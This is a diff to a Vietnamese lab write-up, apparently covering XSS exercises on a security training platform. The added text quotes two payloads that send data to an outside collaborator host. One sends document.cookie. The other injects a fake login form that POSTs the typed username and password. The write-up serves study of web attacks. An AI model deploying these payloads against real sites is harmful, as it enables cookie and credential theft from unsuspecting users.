@@ -570,19 +570,35 @@ fetch() là một hàm JavaScript dùng để gửi yêu cầu HTTP (GET, POST, 
 <h1>---------------------------------------------------------</h1>
 <br>
 
+![image](https://github.com/user-attachments/assets/2158e97a-a368-4d63-b3ba-6df8845bc74c)
 
+Không biết tôi có sai bước nào không mà không thử cho cái `lmao</p><script>new Image().src = "https://2dgpn695qg8wnvs8bfj8jmexzo5ft9hy.oastify.com/?cookie=" + document.cookie;</script><p>abcd` vào mà không thấy cookie đâu 
 
+![image](https://github.com/user-attachments/assets/e18100a2-7202-48e3-8a02-68edc8e6d095)
 
+Tôi tìm thấy cái `cookie=secret=IY8sgzmwp1XxsWdRvX3CSBSy2bA4xTQk` này, không biết là gì 
 
+![image](https://github.com/user-attachments/assets/7e615295-b156-4d45-b33a-2a9f3b9b91da)
 
+Sau 1 lúc nghĩ linh tinh thì không biết làm thế nào để lấy password, mở solution thì nó là làm hẳn cái ô nhập username và password, tôi không nghĩ đến việc nạn nhân nhập username password vào cái này...
 
+![image](https://github.com/user-attachments/assets/5a561ad6-3f70-470c-a271-bd1ae7dc0825)
 
+![image](https://github.com/user-attachments/assets/9e0a7c99-108a-4415-b63d-abf7962e522e)
 
+Đáng ra đề nên thêm cái hint là nạn nhân có thể nhập được...
 
+![image](https://github.com/user-attachments/assets/985ea1a8-6f55-44bf-b21d-ac03f160db52)
 
+Payload: `<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://kj77tofnwyeetdyqhxpqp4kf56bxztni.oastify.com',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">`
 
-
-
+<h1>---------------------------------------------------------</h1>
+<br>
 
 
 
